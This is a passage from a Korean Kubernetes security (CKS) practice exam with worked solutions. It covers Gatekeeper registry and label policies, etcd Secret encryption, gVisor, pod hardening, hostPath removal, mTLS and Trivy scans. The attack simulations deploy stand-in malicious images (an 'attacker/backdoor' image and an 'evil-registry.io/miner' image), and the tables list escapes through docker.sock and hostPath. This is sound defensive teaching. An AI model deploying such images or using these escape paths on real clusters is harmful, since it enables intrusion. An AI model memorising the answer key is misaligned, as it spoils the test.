**출제 의도:** Pod Security Admission의 3가지 모드(enforce/warn/audit)를 조합하여 점진적 보안 강화 전략을 수립하는 능력을 검증한다.

**핵심 원리:** PSA는 API server의 내장 어드미션 컨트롤러이다. enforce는 위반 시 요청을 거부하고, warn은 클라이언트에 경고 메시지를 반환하되 허용하며, audit은 audit 로그에만 기록한다. baseline 레벨은 privileged, hostNetwork, hostPID, hostIPC 등 명백한 위험 설정을 차단한다. restricted 레벨은 baseline에 추가로 seccomp, non-root, capabilities drop 등을 강제한다.

**함정과 주의사항:**
- `enforce=baseline`과 `warn=restricted`를 동시에 설정하면, baseline을 위반하는 Pod는 거부되고, baseline은 통과하지만 restricted를 위반하는 Pod는 경고와 함께 생성된다. 이 조합의 의미를 정확히 이해해야 한다.
- `enforce-version`을 설정하지 않으면 API server 버전의 최신 정책이 적용된다.
- DaemonSet, Job 등 컨트롤러가 생성하는 Pod도 PSA의 영향을 받는다. 기존 워크로드가 baseline을 위반하면 새 Pod 생성이 실패할 수 있다.

**공격-방어 매핑:**
| 공격 벡터 | 방어 효과 |
|---|---|
| privileged 컨테이너로 호스트 탈출 | baseline에서 privileged=true 차단 |
| hostNetwork으로 노드 네트워크 접근 | baseline에서 hostNetwork 차단 |
| hostPID로 호스트 프로세스 접근 | baseline에서 hostPID 차단 |
</details>

---

### 문제 18. [Microservice Vulnerabilities] OPA Gatekeeper - 필수 라벨 정책

OPA Gatekeeper를 사용하여, 모든 Deployment에 `app` 라벨과 `team` 라벨이 반드시 포함되도록 하는 정책을 작성하고 적용하라.

<details>
<summary>풀이 확인</summary>

**풀이:**
```yaml
# ConstraintTemplate
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8srequiredlabels
spec:
  crd:
    spec:
      names:
        kind: K8sRequiredLabels
      validation:
        openAPIV3Schema:
          type: object
          properties:
            labels:
              type: array
              items:
                type: string
  targets:
  - target: admission.k8s.gatekeeper.sh
    rego: |
      package k8srequiredlabels

      violation[{"msg": msg, "details": {"missing_labels": missing}}] {
        provided := {label | input.review.object.metadata.labels[label]}
        required := {label | label := input.parameters.labels[_]}
        missing := required - provided
        count(missing) > 0
        msg := sprintf("필수 라벨이 누락되었습니다: %v", [missing])
      }
---
# Constraint
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sRequiredLabels
metadata:
  name: deployment-required-labels
spec:
  match:
    kinds:
    - apiGroups: ["apps"]
      kinds: ["Deployment"]
  parameters:
    labels:
    - "app"
    - "team"
```
```bash
kubectl apply -f constrainttemplate.yaml
kubectl apply -f constraint.yaml

# ConstraintTemplate이 준비될 때까지 잠시 대기
kubectl get constrainttemplate k8srequiredlabels

# 검증: 필수 라벨 없는 Deployment 생성 시도
kubectl create deployment test --image=nginx
# Error: 필수 라벨이 누락되었습니다: {"app", "team"}
# (app 라벨은 create deployment에서 자동 추가되므로 team만 누락될 수 있음)

# 올바른 Deployment
kubectl create deployment test --image=nginx --dry-run=client -o yaml | \
  kubectl label --local -f - team=backend -o yaml | \
  kubectl apply -f -
```

ConstraintTemplate은 Rego 코드로 정책 로직을 정의하고, Constraint는 해당 템플릿을 기반으로 구체적인 파라미터와 적용 범위를 지정한다. `input.review.object`가 검사 대상 쿠버네티스 리소스를 나타낸다.

**검증 - 공격 시뮬레이션:**
```bash
# 라벨이 누락된 Deployment 생성 시도
kubectl create deployment test-no-label --image=nginx
```
```text
Error from server (Forbidden): admission webhook "validation.gatekeeper.sh" denied the request: [deployment-required-labels] 필수 라벨이 누락되었습니다: {"team"}
```
```bash
# 올바른 라벨이 있는 Deployment 생성
kubectl create deployment test-labeled --image=nginx --dry-run=client -o yaml | \
  kubectl label --local -f - team=backend -o yaml | kubectl apply -f -
```
```text
deployment.apps/test-labeled created
```
```bash
# Constraint 위반 현황 확인
kubectl get k8srequiredlabels deployment-required-labels -o jsonpath='{.status.totalViolations}'
```
```text
0
```

**출제 의도:** OPA Gatekeeper의 ConstraintTemplate/Constraint 패턴을 이해하고 정책 기반 거버넌스를 구현하는 능력을 검증한다. 라벨 강제는 리소스 관리와 보안 정책 적용의 기반이다.

**핵심 원리:** OPA Gatekeeper는 Kubernetes Validating Admission Webhook으로 동작한다. API server가 리소스 생성/수정 요청을 받으면 Gatekeeper에 전달하고, Gatekeeper는 Rego 언어로 작성된 정책을 OPA 엔진에서 평가한다. `input.review.object`는 요청 대상 리소스, `input.parameters`는 Constraint에서 전달한 파라미터이다. 집합 연산(`required - provided`)으로 누락된 라벨을 계산한다.

**함정과 주의사항:**
- ConstraintTemplate을 먼저 apply한 후 Constraint를 apply해야 한다. 순서가 반대이면 CRD가 존재하지 않아 에러가 발생한다.
- ConstraintTemplate이 Ready 상태가 되기까지 수 초가 걸릴 수 있다. `kubectl get constrainttemplate` 상태를 확인 후 Constraint를 적용하라.
- `kubectl create deployment`는 자동으로 `app` 라벨을 추가하므로 `team`만 누락된다. 시험에서 "두 라벨 모두 누락"을 테스트하려면 raw YAML로 생성하라.

**공격-방어 매핑:**
| 공격 벡터 | 방어 효과 |
|---|---|
| 추적 불가능한 익명 워크로드 배포 | 필수 라벨 강제로 모든 워크로드 식별 가능 |
| 팀 소유권 없는 리소스 방치 | team 라벨로 소유 팀 추적 |
| 보안 정책 적용 대상 누락 | 라벨 기반 NetworkPolicy/RBAC 적용 보장 |
</details>

---

### 문제 19. [Microservice Vulnerabilities] OPA Gatekeeper - 허용 레지스트리 제한

OPA Gatekeeper를 사용하여, Pod에서 사용하는 컨테이너 이미지가 `docker.io/library/`와 `gcr.io/company/` 레지스트리에서만 가져올 수 있도록 제한하는 정책을 작성하라.

<details>
<summary>풀이 확인</summary>

**풀이:**
```yaml
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8sallowedrepos
spec:
  crd:
    spec:
      names:
        kind: K8sAllowedRepos
      validation:
        openAPIV3Schema:
          type: object
          properties:
            repos:
              type: array
              items:
                type: string
  targets:
  - target: admission.k8s.gatekeeper.sh
    rego: |
      package k8sallowedrepos

      violation[{"msg": msg}] {
        container := input.review.object.spec.containers[_]
        satisfied := [good | repo = input.parameters.repos[_]; good = startswith(container.image, repo)]
        not any(satisfied)
        msg := sprintf("이미지 '%v'는 허용된 레지스트리에 속하지 않습니다. 허용: %v", [container.image, input.parameters.repos])
      }

      violation[{"msg": msg}] {
        container := input.review.object.spec.initContainers[_]
        satisfied := [good | repo = input.parameters.repos[_]; good = startswith(container.image, repo)]
        not any(satisfied)
        msg := sprintf("initContainer 이미지 '%v'는 허용된 레지스트리에 속하지 않습니다. 허용: %v", [container.image, input.parameters.repos])
      }
---
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sAllowedRepos
metadata:
  name: allowed-repos-only
spec:
  match:
    kinds:
    - apiGroups: [""]
      kinds: ["Pod"]
  parameters:
    repos:
    - "docker.io/library/"
    - "gcr.io/company/"
```
```bash
kubectl apply -f allowed-repos.yaml

# 검증
kubectl run test --image=quay.io/malicious/app
# Error: 이미지 'quay.io/malicious/app'는 허용된 레지스트리에 속하지 않습니다

kubectl run test --image=docker.io/library/nginx:1.25
# (성공)
```

initContainers도 반드시 검사해야 한다. 공격자가 initContainer에 악성 이미지를 넣어 우회할 수 있기 때문이다.

**검증 - 공격 시뮬레이션:**
```bash
# 허용되지 않은 레지스트리 이미지 사용 시도
kubectl run malicious --image=quay.io/attacker/backdoor:latest
```
```text
Error from server (Forbidden): admission webhook "validation.gatekeeper.sh" denied the request: [allowed-repos-only] 이미지 'quay.io/attacker/backdoor:latest'는 허용된 레지스트리에 속하지 않습니다. 허용: ["docker.io/library/", "gcr.io/company/"]
```
```bash
# initContainer에 악성 이미지 사용 시도
kubectl apply -f - <<'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: sneaky
spec:
  initContainers:
  - name: init
    image: evil-registry.io/miner:latest
  containers:
  - name: app
    image: docker.io/library/nginx:1.25
EOF
```
```text
Error from server (Forbidden): admission webhook "validation.gatekeeper.sh" denied the request: [allowed-repos-only] initContainer 이미지 'evil-registry.io/miner:latest'는 허용된 레지스트리에 속하지 않습니다.
```
```bash
# 허용된 레지스트리 이미지 사용 (성공)
kubectl run safe --image=docker.io/library/nginx:1.25
```
```text
pod/safe created
```

**출제 의도:** 공급망 보안의 핵심인 신뢰할 수 있는 이미지 레지스트리 제한 능력을 검증한다. 비인가 레지스트리에서 악성 이미지를 pull하는 것을 방지한다.

**핵심 원리:** OPA Gatekeeper의 Rego 정책에서 `startswith()` 함수로 이미지 이름의 접두사를 검사하여 허용된 레지스트리에서 가져온 이미지만 허용한다. `containers`와 `initContainers` 모두를 별도 규칙으로 검사해야 한다. `ephemeralContainers`도 검사 대상에 포함해야 완전한 정책이 된다.

**함정과 주의사항:**
- `nginx:1.25`처럼 레지스트리를 생략하면 Docker Hub의 `docker.io/library/nginx:1.25`로 해석된다. 정책에서 `docker.io/library/`를 허용 목록에 포함해야 이런 이미지를 사용할 수 있다.
- initContainers 검사를 빠뜨리면 공격자가 initContainer에 악성 이미지를 넣어 우회할 수 있다.
- `ephemeralContainers`(디버깅용 임시 컨테이너)도 검사하지 않으면 `kubectl debug`로 우회 가능하다.

**공격-방어 매핑:**
| 공격 벡터 | 방어 효과 |
|---|---|
| 악성 이미지 레지스트리에서 크립토마이너 배포 | 허용 레지스트리 외 이미지 차단 |
| typosquatting(유사 이미지 이름) 공격 | 허용된 레지스트리 접두사만 통과 |
| initContainer를 통한 정책 우회 | initContainers 별도 검사 |
</details>

---

### 문제 20. [Microservice Vulnerabilities] Secret 암호화 (Encryption at Rest)

etcd에 저장되는 Secret을 aescbc 방식으로 암호화하도록 설정하라. 설정 후 기존 Secret을 재암호화하라.

<details>
<summary>풀이 확인</summary>

**풀이:**
```bash
# 1. 암호화 키 생성
head -c 32 /dev/urandom | base64
# 출력 예: aTU0RnE1aEpzMWRRYnhZdDhLUjdYS2JkTXRPeGprWno=

# 2. EncryptionConfiguration 파일 생성
cat > /etc/kubernetes/encryption-config.yaml << 'EOF'
apiVersion: apiserver.config.k8s.io/v1
kind: EncryptionConfiguration
resources:
  - resources:
    - secrets
    providers:
    - aescbc:
        keys:
        - name: key1
          secret: aTU0RnE1aEpzMWRRYnhZdDhLUjdYS2JkTXRPeGprWno=
    - identity: {}
EOF

# 3. API server 매니페스트 백업
cp /etc/kubernetes/manifests/kube-apiserver.yaml /tmp/kube-apiserver.yaml.bak

# 4. API server 매니페스트 수정
vi /etc/kubernetes/manifests/kube-apiserver.yaml
```

추가할 내용:
```yaml
spec:
  containers:
  - command:
    - kube-apiserver
    - --encryption-provider-config=/etc/kubernetes/encryption-config.yaml
    volumeMounts:
    - name: encryption-config
      mountPath: /etc/kubernetes/encryption-config.yaml
      readOnly: true
  volumes:
  - name: encryption-config
    hostPath:
      path: /etc/kubernetes/encryption-config.yaml
      type: File
```
```bash
# 5. API server 재시작 대기
watch crictl ps | grep kube-apiserver

# 6. 기존 Secret 재암호화
kubectl get secrets --all-namespaces -o json | kubectl replace -f -

# 7. 암호화 확인
ETCDCTL_API=3 etcdctl \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  get /registry/secrets/default/my-secret | hexdump -C
# k8s:enc:aescbc:v1:key1 접두어가 보이면 암호화 성공
```

`identity: {}`를 providers 목록의 마지막에 두면 기존 암호화되지 않은 Secret을 읽을 수 있다. 첫 번째 provider(aescbc)가 새로 저장되는 Secret에 사용된다.

**검증 - 공격 시뮬레이션:**
```bash
# 테스트 Secret 생성
kubectl create secret generic test-encryption --from-literal=password=s3cret123

# etcd에서 직접 조회하여 암호화 확인
ETCDCTL_API=3 etcdctl \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  get /registry/secrets/default/test-encryption | hexdump -C | head -5
```
```text
00000000  2f 72 65 67 69 73 74 72  79 2f 73 65 63 72 65 74  |/registry/secret|
00000010  73 2f 64 65 66 61 75 6c  74 2f 74 65 73 74 2d 65  |s/default/test-e|
00000020  6e 63 72 79 70 74 69 6f  6e 0a 6b 38 73 3a 65 6e  |ncryption.k8s:en|
00000030  63 3a 61 65 73 63 62 63  3a 76 31 3a 6b 65 79 31  |c:aescbc:v1:key1|
00000040  3a ... (암호화된 바이너리 데이터)                    |...............|
```
```bash
# "k8s:enc:aescbc:v1:key1" 접두어가 보이면 암호화 성공
# "password=s3cret123"이 평문으로 보이지 않아야 함

# kubectl로는 정상 접근 가능 (API server가 복호화)
kubectl get secret test-encryption -o jsonpath='{.data.password}' | base64 -d
```
```text
s3cret123
```

**출제 의도:** etcd에 저장되는 Secret의 저장 시 암호화(Encryption at Rest)를 설정하는 능력을 검증한다. etcd가 침해되어도 Secret 데이터가 평문으로 노출되지 않도록 보호한다.

**핵심 원리:** Kubernetes API server는 EncryptionConfiguration에 정의된 프로바이더를 사용하여 etcd에 쓰기 전에 데이터를 암호화하고, 읽을 때 복호화한다. `aescbc`는 AES-256-CBC 대칭 암호화를 사용한다. providers 목록의 순서가 중요하다: 첫 번째 프로바이더가 암호화에 사용되고, 모든 프로바이더가 복호화에 시도된다. `identity: {}`는 평문 프로바이더로, 암호화 적용 전에 저장된 기존 데이터를 읽기 위해 필요하다.

**함정과 주의사항:**
- `identity: {}`를 providers 목록의 첫 번째에 두면 새 Secret이 평문으로 저장된다. 반드시 `aescbc`가 첫 번째여야 한다.
- `--encryption-provider-config` 플래그와 함께 volume/volumeMount를 추가해야 한다. 파일 경로만 지정하고 마운트를 빠뜨리면 API server가 시작되지 않는다.
- 기존 Secret을 재암호화하려면 `kubectl get secrets --all-namespaces -o json | kubectl replace -f -`를 실행해야 한다. 이 명령은 모든 Secret을 읽어서 다시 쓰므로 첫 번째 프로바이더로 암호화된다.
- 암호화 키를 분실하면 Secret 데이터를 복구할 수 없다. 키를 안전하게 백업하라.

**공격-방어 매핑:**
| 공격 벡터 | 방어 효과 |
|---|---|
| etcd 데이터 파일 직접 접근 | 암호화로 평문 Secret 노출 방지 |
| etcd 백업 파일 탈취 | 암호화 키 없이는 복호화 불가 |
| etcd API를 통한 Secret 직접 조회 | 암호화된 바이너리 데이터만 반환 |
</details>

---

### 문제 21. [Microservice Vulnerabilities] RuntimeClass 생성 및 적용

gVisor(runsc) RuntimeClass를 생성하고, `sandboxed` 네임스페이스의 Pod에 적용하라.

<details>
<summary>풀이 확인</summary>

**풀이:**
```yaml
# RuntimeClass 생성
apiVersion: node.k8s.io/v1
kind: RuntimeClass
metadata:
  name: gvisor
handler: runsc
---
# Pod에서 사용
apiVersion: v1
kind: Pod
metadata:
  name: sandboxed-pod
  namespace: sandboxed
spec:
  runtimeClassName: gvisor
  containers:
  - name: app
    image: nginx:1.25
    ports:
    - containerPort: 80
```
```bash
kubectl apply -f runtimeclass.yaml
kubectl apply -f sandboxed-pod.yaml

# 검증
kubectl get runtimeclass
kubectl get pod sandboxed-pod -n sandboxed

# gVisor 런타임으로 실행되는지 확인
kubectl exec sandboxed-pod -n sandboxed -- dmesg | head -5
# "Starting gVisor" 관련 메시지가 출력되면 성공
```

RuntimeClass의 `handler` 필드는 containerd 설정(`/etc/containerd/config.toml`)에 정의된 런타임 핸들러 이름과 일치해야 한다. 해당 노드에 gVisor가 설치되어 있지 않으면 Pod가 생성되지 않는다.

**검증 - 공격 시뮬레이션:**
```bash
# gVisor 런타임으로 실행 중인지 확인
kubectl exec sandboxed-pod -n sandboxed -- dmesg | head -3
```
```text
[    0.000000] Starting gVisor...
[    0.000000] Checking navel for lint...
[    0.000000] Creating process schedule...
```
```bash
# gVisor는 호스트 커널 정보를 숨김
kubectl exec sandboxed-pod -n sandboxed -- uname -r
```
```text
4.4.0
```
```bash
# 호스트 커널 버전과 다른 것을 확인 (gVisor 가상화 확인)
# 호스트: 5.15.x, gVisor 내부: 4.4.0

# 시스템콜 직접 실행이 제한됨 (gVisor가 필터링)
kubectl exec sandboxed-pod -n sandboxed -- cat /proc/self/status | grep Seccomp
```
```text
Seccomp:	2
Seccomp_filters:	1
```

**출제 의도:** gVisor 같은 샌드박스 런타임을 사용하여 컨테이너와 호스트 커널 사이에 추가 격리 계층을 도입하는 능력을 검증한다. 신뢰할 수 없는 워크로드를 실행할 때 필수적이다.

**핵심 원리:** gVisor(runsc)는 사용자 공간에서 Linux 커널 인터페이스를 재구현한 샌드박스 런타임이다. 컨테이너의 시스템콜을 호스트 커널에 직접 전달하지 않고 gVisor의 Sentry가 가로채서 처리한다. 이로써 커널 취약점을 통한 컨테이너 탈출을 방지한다. RuntimeClass는 Pod별로 다른 OCI 런타임을 선택할 수 있게 하는 Kubernetes 리소스이다. containerd의 `[plugins."io.containerd.grpc.v1.cri".containerd.runtimes.runsc]` 설정과 매핑된다.

**함정과 주의사항:**
- `runtimeClassName` 필드는 Pod spec에 지정하며, Deployment에서는 `spec.template.spec.runtimeClassName`이다.
- gVisor는 모든 시스템콜을 지원하지 않는다. 일부 애플리케이션이 호환되지 않을 수 있다.
- RuntimeClass가 존재하지 않거나 handler가 containerd 설정에 없으면 Pod가 `Failed` 상태가 된다. 에러 메시지에 "handler not found"가 표시된다.
- 노드에 gVisor가 설치되어 있어야 한다. 특정 노드에만 설치된 경우 `nodeSelector`나 `scheduling` 필드를 사용하라.

**공격-방어 매핑:**
| 공격 벡터 | 방어 효과 |
|---|---|
| 커널 취약점을 통한 컨테이너 탈출 | gVisor가 시스템콜을 가로채어 호스트 커널 노출 최소화 |
| /proc, /sys를 통한 호스트 정보 수집 | gVisor가 가상화된 정보 제공 |
| 권한 상승 익스플로잇 | gVisor의 제한된 시스템콜 인터페이스가 공격 차단 |
</details>

---

### 문제 22. [Microservice Vulnerabilities] 컨테이너 보안 컨텍스트 강화

다음 보안 요구사항을 모두 충족하는 Pod를 생성하라:
1. non-root 사용자로 실행 (UID: 1000)
2. 권한 상승 비활성화
3. 읽기 전용 루트 파일시스템
4. 모든 Linux capabilities drop
5. RuntimeDefault seccomp 프로파일 적용

<details>
<summary>풀이 확인</summary>

**풀이:**
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: hardened-pod
  namespace: default
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    runAsGroup: 3000
    fsGroup: 2000
    seccompProfile:
      type: RuntimeDefault
  containers:
  - name: app
    image: nginx:1.25
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      capabilities:
        drop: ["ALL"]
    volumeMounts:
    - name: tmp
      mountPath: /tmp
    - name: cache
      mountPath: /var/cache/nginx
    - name: run
      mountPath: /var/run
    - name: log
      mountPath: /var/log/nginx
  volumes:
  - name: tmp
    emptyDir: {}
  - name: cache
    emptyDir: {}
  - name: run
    emptyDir: {}
  - name: log
    emptyDir: {}
```
```bash
kubectl apply -f hardened-pod.yaml

# 검증
kubectl exec hardened-pod -- id
# uid=1000 gid=3000

kubectl exec hardened-pod -- touch /root/test.txt
# Read-only file system

kubectl exec hardened-pod -- cat /proc/1/status | grep -i cap
# CapBnd: 0000000000000000 (모든 capabilities 제거됨)
```

`readOnlyRootFilesystem: true`를 설정하면 nginx가 쓰기 권한이 필요한 디렉토리(`/var/cache/nginx`, `/var/run`, `/var/log/nginx`)를 emptyDir로 마운트해야 한다. 이렇게 해야 nginx가 정상 동작한다.

**검증 - 공격 시뮬레이션:**
```bash
# 루트 파일시스템 쓰기 차단 확인
kubectl exec hardened-pod -- touch /root/malware
```
```text
touch: /root/malware: Read-only file system
command terminated with exit code 1
```
```bash
# 실행 사용자 확인 (non-root)
kubectl exec hardened-pod -- id
```
```text
uid=1000 gid=3000 groups=2000
```
```bash
# capabilities 전부 제거 확인
kubectl exec hardened-pod -- cat /proc/1/status | grep -i capbnd
```
```text
CapBnd:	0000000000000000
```
```bash
# 권한 상승 시도 (실패)
kubectl exec hardened-pod -- su root
```
```text
su: must be suid to work properly
```
```bash
# 허용된 emptyDir 경로에는 쓰기 가능
kubectl exec hardened-pod -- touch /tmp/allowed
kubectl exec hardened-pod -- ls /tmp/allowed
```
```text
/tmp/allowed
```

**출제 의도:** defense-in-depth(심층 방어) 원칙에 따라 여러 보안 설정을 조합하여 컨테이너를 최대한 강화하는 능력을 검증한다. CKS 시험에서 가장 빈출되는 패턴이다.

**핵심 원리:** 각 보안 설정은 서로 다른 레이어를 방어한다. `runAsNonRoot/runAsUser`는 DAC(임의적 접근 제어)로 루트 권한을 제거한다. `capabilities.drop: ["ALL"]`은 커널 capability 시스템에서 모든 특권을 제거한다. `readOnlyRootFilesystem`은 VFS 레이어에서 쓰기를 차단한다. `allowPrivilegeEscalation: false`는 PR_SET_NO_NEW_PRIVS 커널 플래그를 설정하여 execve()를 통한 권한 상승(setuid 바이너리)을 방지한다. `seccompProfile: RuntimeDefault`는 BPF 필터로 위험 시스템콜을 차단한다.

**함정과 주의사항:**
- nginx는 기본적으로 루트로 시작하여 워커 프로세스를 생성한다. `runAsUser: 1000`으로 설정하면 80번 포트 바인딩이 실패할 수 있다. nginx 설정에서 8080 등 비특권 포트를 사용하거나, `nginx-unprivileged` 이미지를 사용하라.
- `readOnlyRootFilesystem`과 emptyDir를 함께 사용할 때, 애플리케이션이 쓰기를 필요로 하는 모든 경로를 빠짐없이 마운트해야 한다. 하나라도 빠지면 애플리케이션이 시작되지 않는다.
- `fsGroup`은 emptyDir 볼륨의 그룹 소유권을 설정한다. 애플리케이션이 특정 GID를 필요로 하면 이 값을 조정하라.

**공격-방어 매핑:**
| 공격 벡터 | 방어 효과 |
|---|---|
| 루트 권한으로 호스트 파일 접근 | runAsNonRoot + runAsUser로 비루트 실행 |
| setuid 바이너리로 권한 상승 | allowPrivilegeEscalation: false + capabilities drop |
| 악성 바이너리/웹셸 설치 | readOnlyRootFilesystem으로 파일 쓰기 차단 |
| 커널 익스플로잇 | seccomp RuntimeDefault로 위험 시스템콜 차단 |
</details>

---

### 문제 23. [Microservice Vulnerabilities] Pod에서 hostPath 볼륨 사용 금지

`app-ns` 네임스페이스에서 실행 중인 Pod 중 hostPath 볼륨을 사용하는 것을 찾아 해당 볼륨을 emptyDir로 교체하라.

<details>
<summary>풀이 확인</summary>

**풀이:**
```bash
# 1. hostPath 볼륨을 사용하는 Pod 찾기
kubectl get pods -n app-ns -o json | \
  jq -r '.items[] | select(.spec.volumes[]? | .hostPath != null) | .metadata.name'

# 2. 해당 Pod의 현재 설정 확인
kubectl get pod <pod-name> -n app-ns -o yaml > pod-original.yaml

# 3. hostPath를 emptyDir로 교체
# 수정 전:
#   volumes:
#   - name: data
#     hostPath:
#       path: /var/data
#       type: Directory
#
# 수정 후:
#   volumes:
#   - name: data
#     emptyDir: {}

# 4. Pod 재생성 (Pod는 직접 수정 불가한 필드가 있으므로 삭제 후 재생성)
kubectl delete pod <pod-name> -n app-ns
kubectl apply -f pod-modified.yaml

# 5. Deployment인 경우 직접 수정 가능
kubectl edit deployment <deployment-name> -n app-ns
# volumes 섹션에서 hostPath를 emptyDir로 교체
```

hostPath 볼륨은 호스트 노드의 파일시스템에 직접 접근할 수 있어 보안 위험이 크다. 컨테이너가 호스트의 민감한 파일에 접근하거나 수정할 수 있기 때문이다. emptyDir는 Pod 내에서만 존재하는 임시 볼륨이므로 안전하다.

**검증 - 공격 시뮬레이션:**
```bash
# hostPath 사용 Pod 찾기
kubectl get pods -n app-ns -o json | \
  jq -r '.items[] | select(.spec.volumes[]? | .hostPath != null) | .metadata.name'
```
```text
data-processor-pod
```
```bash
# hostPath 제거 전: 호스트 파일시스템 접근 가능 (위험)
kubectl exec data-processor-pod -n app-ns -- ls /host-data/
```
```text
etc  var  root  home  ...
```
```bash
# hostPath를 emptyDir로 교체 후: 호스트 접근 불가, 빈 디렉토리
kubectl exec data-processor-pod-new -n app-ns -- ls /data/
```
```text
(빈 디렉토리)
```

**출제 의도:** hostPath 볼륨의 보안 위험을 식별하고 안전한 대안(emptyDir)으로 교체하는 능력을 검증한다. hostPath는 컨테이너 탈출의 가장 쉬운 경로 중 하나이다.

**핵심 원리:** hostPath 볼륨은 노드의 파일시스템을 컨테이너에 직접 마운트한다. 컨테이너가 루트로 실행되면 호스트의 `/etc/shadow`, `/var/run/docker.sock`, `/etc/kubernetes/` 등 민감한 파일에 접근할 수 있다. emptyDir는 Pod 수명과 함께하는 임시 볼륨으로, kubelet이 노드의 임시 디렉토리에 생성하며 Pod 삭제 시 함께 제거된다.

**함정과 주의사항:**
- Pod의 volumes 필드는 immutable이므로 직접 수정할 수 없다. 반드시 삭제 후 재생성해야 한다.
- Deployment의 경우 `kubectl edit deployment`로 직접 수정 가능하다. 새 ReplicaSet이 생성되며 롤링 업데이트가 수행된다.
- hostPath 삭제 시 해당 데이터가 필요한 경우 PersistentVolume으로 마이그레이션을 고려하라.
- `type: DirectoryOrCreate` hostPath는 디렉토리가 없으면 생성하므로, 공격자가 임의 경로에 디렉토리를 생성할 수 있다.

**공격-방어 매핑:**
| 공격 벡터 | 방어 효과 |
|---|---|
| hostPath로 /etc/shadow 읽기 | hostPath 제거로 호스트 파일 접근 차단 |
| hostPath로 docker.sock 접근하여 컨테이너 탈출 | emptyDir는 호스트 파일시스템에 매핑되지 않음 |
| hostPath에 crontab 작성하여 지속성 확보 | 호스트 쓰기 경로 자체가 없음 |
</details>

---

### 문제 24. [Microservice Vulnerabilities] mTLS 개념 - Istio PeerAuthentication

Istio가 설치된 클러스터에서 `production` 네임스페이스의 모든 서비스 간 통신에 STRICT mTLS를 적용하라.

<details>
<summary>풀이 확인</summary>

**풀이:**
```yaml
apiVersion: security.istio.io/v1beta1
kind: PeerAuthentication
metadata:
  name: default
  namespace: production
spec:
  mtls:
    mode: STRICT
```
```bash
kubectl apply -f peer-auth.yaml

# 검증: mTLS 상태 확인
kubectl get peerauthentication -n production

# 평문 트래픽이 차단되는지 확인 (사이드카가 없는 Pod에서 접근 시도)
kubectl run test --image=busybox -n default --rm -it -- \
  wget -qO- --timeout=2 http://my-service.production.svc:8080
# Connection refused 또는 TLS handshake 에러
```

STRICT 모드에서는 Istio 사이드카 프록시가 없는 클라이언트의 평문 트래픽이 거부된다. PERMISSIVE 모드는 mTLS와 평문 모두 허용하므로 마이그레이션 시 사용한다.

**검증 - 공격 시뮬레이션:**
```bash
# 사이드카가 없는 Pod에서 production 서비스로 평문 접근 시도
kubectl run attacker --image=busybox -n default --rm -it -- \
  wget -qO- --timeout=3 http://my-service.production.svc:8080
```
```text
wget: error getting response: Connection reset by peer
```
```bash
# 사이드카가 있는 Pod에서 접근 (mTLS 자동 적용, 성공)
kubectl exec -n production client-pod -- curl -s http://my-service:8080
```
```text
HTTP/1.1 200 OK
...
```
```bash
# mTLS 상태 확인
istioctl x describe service my-service -n production
```
```text
Service: my-service
   Port: http 8080/HTTP targets pod port 8080
STRICT mTLS is enforced for this service
```

**출제 의도:** 서비스 메시를 활용한 서비스 간 통신 암호화와 상호 인증(mTLS) 설정 능력을 검증한다. 네트워크 도청과 스푸핑 공격을 방지하는 핵심 보안 메커니즘이다.

**핵심 원리:** mTLS(mutual TLS)는 클라이언트와 서버가 서로의 인증서를 검증하는 양방향 TLS이다. Istio의 Envoy 사이드카 프록시가 자동으로 인증서를 관리하고 TLS 핸드셰이크를 수행한다. STRICT 모드에서는 사이드카가 없는(평문) 트래픽을 거부하고, PERMISSIVE 모드에서는 mTLS와 평문 모두 허용한다. 인증서는 Istio의 istiod(citadel)가 자동 발급하고 주기적으로 로테이션한다.

**함정과 주의사항:**
- STRICT mTLS를 적용하면 사이드카가 주입되지 않은 Pod(예: 모니터링 도구, 외부 서비스)와의 통신이 차단된다. 먼저 PERMISSIVE로 테스트 후 STRICT로 전환하라.
- 네임스페이스 레벨 PeerAuthentication과 mesh 레벨 PeerAuthentication을 혼동하면 안 된다. 네임스페이스 레벨이 mesh 레벨보다 우선한다.
- `metadata.name`이 `default`여야 네임스페이스 전체에 적용된다. 다른 이름을 사용하면 워크로드별 정책이 된다.

**공격-방어 매핑:**
| 공격 벡터 | 방어 효과 |
|---|---|
| 네트워크 도청(패킷 스니핑) | TLS 암호화로 통신 내용 보호 |
| 서비스 스푸핑(위장) | 상호 인증서 검증으로 신원 확인 |
| 중간자 공격(MITM) | TLS 인증서 검증으로 차단 |
| 사이드카 없는 악성 Pod의 접근 | STRICT 모드가 평문 트래픽 거부 |
</details>

---

## Supply Chain Security (20%) - 8문제

### 문제 25. [Supply Chain Security] Trivy 이미지 스캔

다음 이미지들을 Trivy로 스캔하고, CRITICAL 취약점이 있는 이미지를 식별하라. CRITICAL 취약점이 없는 이미지만 사용하도록 Deployment를 수정하라.
- `nginx:1.19`
- `nginx:1.25`
- `alpine:3.18`

<details>
<summary>풀이 확인</summary>

**풀이:**
```bash
# 1. 각 이미지 스캔
trivy image --severity CRITICAL nginx:1.19
trivy image --severity CRITICAL nginx:1.25
trivy image --severity CRITICAL alpine:3.18

# 2. exit-code를 사용하여 자동 판별
trivy image --exit-code 1 --severity CRITICAL nginx:1.19
echo $?  # 1이면 CRITICAL 취약점 존재

trivy image --exit-code 1 --severity CRITICAL nginx:1.25
echo $?  # 0이면 CRITICAL 취약점 없음

trivy image --exit-code 1 --severity CRITICAL alpine:3.18
echo $?  # 0이면 CRITICAL 취약점 없음

# 3. CRITICAL 취약점이 없는 이미지로 Deployment 수정
kubectl set image deployment/web nginx=nginx:1.25 -n production
# 또는
kubectl edit deployment web -n production
# image를 CRITICAL 취약점이 없는 버전으로 변경
```

